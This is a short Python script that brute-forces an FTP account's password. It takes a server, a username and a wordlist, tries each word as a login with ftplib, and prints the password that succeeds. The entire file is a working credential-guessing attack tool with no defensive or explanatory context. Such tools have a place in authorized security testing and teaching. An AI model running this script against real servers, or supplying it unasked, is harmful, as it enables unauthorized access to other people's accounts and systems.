#!/usr/bin/python3
import ftplib

server = input("FTP server: ")
user = input("Username: ")

password_list = input("Path to password list: ")

try:
    with open(password_list, 'r') as pw:
        for word in pw:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user, word)
                print(f'Success! The password is: {word}')
                break
            except ftplib.error_perm as exc:
                print(f'Still trying... {exc}')
except Exception as exc:
    print(f'Wordlist error: {exc}')

                
